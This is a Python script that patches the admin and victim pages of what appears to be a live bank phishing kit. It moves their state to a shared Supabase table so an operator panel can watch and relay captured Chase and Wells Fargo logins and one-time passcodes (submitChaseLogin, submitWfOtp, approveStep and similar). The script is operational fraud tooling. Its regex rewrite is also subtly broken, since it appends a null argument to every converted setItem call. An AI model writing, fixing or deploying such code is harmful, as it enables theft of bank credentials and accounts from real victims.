import re
import sys

def process_file(filename):
    with open(filename, 'r', encoding='utf-8') as f:
        content = f.read()

    # Define the new sync block
    sync_block = """
        let globalState = {};

        async function getFullState() {
            try {
                const res = await fetch(SUPABASE_URL + '/rest/v1/otp_state?select=expectedOtp&id=eq.1', {
                    headers: { 'apikey': SUPABASE_KEY, 'Authorization': 'Bearer ' + SUPABASE_KEY }
                });
                if (!res.ok) return {};
                const rows = await res.json();
                const val = (rows && rows.length > 0) ? rows[0].expectedOtp : null;
                if (!val) return {};
                try { return JSON.parse(val); } catch(e) { return { expectedOtp: val }; }
            } catch (e) { return {}; }
        }

        async function setFullState(stateObj) {
            try {
                await fetch(SUPABASE_URL + '/rest/v1/otp_state', {
                    method: 'POST',
                    headers: {
                        'apikey': SUPABASE_KEY,
                        'Authorization': 'Bearer ' + SUPABASE_KEY,
                        'Content-Type': 'application/json',
                        'Prefer': 'resolution=merge-duplicates'
                    },
                    body: JSON.stringify({ id: 1, expectedOtp: JSON.stringify(stateObj) })
                });
            } catch(e) {}
        }

        async function setSyncItem(key, value) {
            let state = await getFullState();
            if (value === null) {
                delete state[key];
            } else {
                state[key] = value;
            }
            await setFullState(state);
            globalState = state;
        }

        function getSyncItem(key) {
            return globalState[key] !== undefined ? globalState[key] : null;
        }
"""

    # Remove old setSync and getSync
    old_sync_regex = re.compile(r'async function setSync\(key, value\).*?return val \|\| null;\s*\n\s*\}\s*\n\s*\} catch \(e\) \{\s*\n\s*console\.error\(\'getSync fetch error:\', e\);\s*\n\s*return null;\s*\n\s*\}\s*\n\s*\}', re.DOTALL)
    content = old_sync_regex.sub(sync_block, content)

    # Convert function names to async
    funcs_to_async = ['requestOtp', 'approveStep', 'submit401kOtp', 'sendAdminMessage', 'generateOtp', 'clearData', 'submitChaseLogin', 'submitChaseOtp', 'submitTxOtp', 'submit401k', 'submitWellsFargo', 'submitWfOtp', 'sendMessage']
    for func in funcs_to_async:
        content = re.sub(rf'function {func}\(', f'async function {func}(', content)

    # Fix setInterval to async
    content = re.sub(r'setInterval\(\(\) => \{', 'setInterval(async () => {\n            globalState = await getFullState();', content)
    
    # Replace localStorage.getItem
    content = content.replace("localStorage.getItem", "getSyncItem")
    
    # Replace localStorage.setItem
    content = content.replace("localStorage.setItem", "await setSyncItem")
    
    # Replace localStorage.removeItem
    content = content.replace("localStorage.removeItem", "await setSyncItem")
    # Note: await setSyncItem(..., null) handles remove
    content = re.sub(r'await setSyncItem\((.*?)\);', r'await setSyncItem(\1, null);', content)
    
    # Replace getSync('expectedOtp') with getSyncItem
    content = content.replace("getSync('expectedOtp')", "getSyncItem('expectedOtp')")
    content = content.replace("setSync('expectedOtp',", "setSyncItem('expectedOtp',")

    # In admin.html, clearData has some issues with setFullState
    if 'clearData' in content:
        content = content.replace("await setSyncItem('adminLogs', null);\n                await setSyncItem('chatHistory', null);\n                await setSyncItem('401kStatus', null);\n                await setSyncItem('wfStatus', null);\n                await setSyncItem('txStatus', null);\n                await setSyncItem('loginStatus', null);", "await setFullState({}); globalState = {};")

    with open(filename, 'w', encoding='utf-8') as f:
        f.write(content)

process_file('admin.html')
process_file('index.html')
print("Done")
